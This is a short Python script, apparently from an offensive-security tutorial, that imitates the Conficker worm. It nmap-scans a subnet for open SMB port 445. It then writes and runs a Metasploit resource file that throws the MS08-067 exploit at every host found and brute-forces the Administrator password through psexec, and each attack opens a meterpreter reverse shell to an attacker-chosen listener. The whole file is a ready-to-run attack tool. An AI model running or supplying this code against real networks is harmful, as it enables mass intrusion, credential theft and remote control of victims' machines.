#!/usr/bin/python3

"""
Replicating Conficker Worm
Final Program - The Conficker Worm using Metasploit
"""

import os
import nmap
import optparse

def findTargets(subnet):
    nmScan = nmap.PortScanner()
    nmScan.scan(subnet,'445')
    tgthosts = []
    
    for host in nmScan.all_hosts():
        if( nmScan[host].has_tcp(445) ):
            state = nmScan[host]['tcp'][445]['state']
            if( state == 'open' ):
                print("[+] Valid target found : " + host)
                tgthosts.append(host)
    
    return tgthosts


def setupHandler( resfile, lhost, lport ):
    resfile.write("use multi/handler\n")
    resfile.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
    resfile.write("set LHOST " + lhost + '\n')
    resfile.write("set LPORT " + str(lport) + '\n')
    resfile.write("exploit -j -z\n")
    resfile.write("setg DisablePayloadHandler True\n")


def confickerExploit( resfile, tgthost, lhost, lport ):
    resfile.write("use windows/smb/ms08_067_netapi\n")
    resfile.write("set RHOSTS " + tgthost + '\n' )
    resfile.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
    resfile.write("set LHOST " + lhost +'\n')
    resfile.write("set LPORT " + str(lport) + '\n')
    resfile.write("exploit -j -z\n")


def smbBrute( resfile, tgthost, passfile, lhost, lport ):
    user = "Administrator"
    with open(passfile,'r') as pF:
        for passwd in pF.readlines():
            passwd = passwd.strip('\r').strip('\n')
            resfile.write("use windows/smb/psexec\n")
            resfile.write("set SMBPass " + str(passwd) + '\n')
            resfile.write("set SMBUser " + str(user) + '\n')
            resfile.write("set RHOSTS " + str(tgthost) + '\n')
            resfile.write("set PAYLOAD windows/meterpreter.reverse_tcp\n")
            resfile.write("set LHOST " + lhost + '\n')
            resfile.write("set LPORT " + str(lport) + '\n')
            resfile.write("exploit -j -z\n")


def main():
    parser = optparse.OptionParser(usage = "Usage : ./Conficker.py -H <target[s]> -l <LHOST> [-p <lport> -w <dictionary>]")
    parser.add_option("-H", dest = 'tgthosts', type = str, help = "Specify Targets to attack")
    parser.add_option("-l", dest = 'lhost', type = str, help = "Specify the host to start the Listener on")
    parser.add_option("-p", dest = 'lport', type = int, help = "Specify the port to start listening on")
    parser.add_option("-w", dest = 'passfile', type = str, help = "Specify dictionary to bruteforce the process execution credentials")
    options,args = parser.parse_args()
    
    if( options.tgthosts == None or options.lhost == None ):
        print(parser.usage)
        exit(0)
    
    lhost    = options.lhost
    lport    = options.lport
    passfile = options.passfile
    tgthosts = findTargets(options.tgthosts)
    
    if( lport == None ):
        lport = 31337
    
    with open('meta.rc','w') as resfile:
        setupHandler( resfile, lhost, lport )
        for target in tgthosts:
            confickerExploit( resfile, target, lhost, lport )
            if( passfile != None ):
                smbBrute( resfile, target, passfile, lhost, lport )
    
    os.system('msfconsole -r meta.rc')


if( __name__ == '__main__' ):
    main()
